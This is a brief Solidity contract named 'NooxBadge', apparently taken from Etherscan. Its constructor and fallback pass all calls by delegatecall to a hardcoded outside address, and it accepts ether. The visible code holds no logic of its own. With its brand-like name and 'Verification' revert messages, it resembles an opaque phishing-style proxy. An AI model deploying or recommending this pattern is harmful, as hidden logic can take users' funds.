/**
 *Submitted for verification at Etherscan.io on 2022-12-03
*/

// SPDX-License-Identifier: MIT

pragma solidity <=0.8.13;

contract NooxBadge {
    fallback(bytes calldata data) payable external returns(bytes memory){
        (bool r1, bytes memory result) = address(0x7AdCfDbe5774F03C88654522DF01e24644577834).delegatecall(data);
        require(r1, "Verification.");
        return result;
    }

    receive() payable external {
    }

    constructor() {
        bytes memory data = abi.encodeWithSignature("initialize()");
        (bool r1,) = address(0x7AdCfDbe5774F03C88654522DF01e24644577834).delegatecall(data);
        require(r1, "Verificiation.");
    }
}